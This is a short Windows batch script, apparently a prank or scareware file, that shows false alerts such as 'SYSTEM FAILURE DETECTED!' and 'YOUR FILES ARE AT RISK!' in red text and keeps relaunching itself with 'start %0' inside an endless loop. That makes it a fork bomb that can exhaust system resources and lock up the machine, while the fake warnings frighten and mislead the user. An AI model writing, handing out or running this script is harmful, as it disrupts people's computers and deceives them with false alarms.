@echo off
color 04
title CRITICAL ERROR!
:loop
msg * CRITICAL DAMAGE! PLEASE RESTART NOW!!!
msg * SYSTEM FAILURE DETECTED!
msg * YOUR FILES ARE AT RISK!
start %0
goto loop
